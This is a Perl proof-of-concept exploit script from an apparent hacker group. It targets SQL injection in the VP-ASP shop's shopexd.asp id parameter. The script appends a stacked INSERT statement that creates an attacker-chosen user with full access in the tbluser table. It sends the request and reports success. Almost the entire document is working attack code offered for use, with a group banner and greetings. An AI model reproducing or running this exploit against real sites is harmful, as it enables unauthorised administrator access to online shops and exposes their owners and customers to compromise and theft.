#!/usr/bin/perl -w
$pamer = "
1ndonesian Security Team (1st)
==============================
tio-fux.pl, vpasp SQL Injection Proof of Concept
Exploit by  : Bosen & TioEuy
Discover by : TioEuy, AresU
Greetz to   : AresU, syzwz (ta for da ipod), TioEuy, sakitjiwa,
muthafuka all #hackers\@centrin.net.id/austnet.org
http://bosen.net/releases/
"; # shut up ! we're the best in our country :)

use LWP::UserAgent;  # LWP Mode sorry im lazy :)
use HTTP::Request;
use HTTP::Response;
$| = 1;
print $pamer;
if ($#ARGV<3){
  print "\n Usage: perl tio-fux.pl <uri> <prod-id> <user> <password>
  \n\n";
    exit;
    }
    my $biji    =
    "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29";
    $tio     = "$ARGV[0]/shopexd.asp?id=$ARGV[1]";
    $tio    .= ";insert into tbluser
    (\"fldusername\",\"fldpassword\",\"fldaccess\") ";
    $tio    .= "values ('$ARGV[2]','$ARGV[3]','$biji')--";

    my $bosen  = LWP::UserAgent->new();
    my $gembel = HTTP::Request->new(GET => $tio);
    my $dodol  = $bosen->request($gembel);
    if ($dodol->is_error()) {
       printf " %s\n", $dodol->status_line;
       } else {
          print "Tuing !\n";
	  }
	  print "\n680165\n";

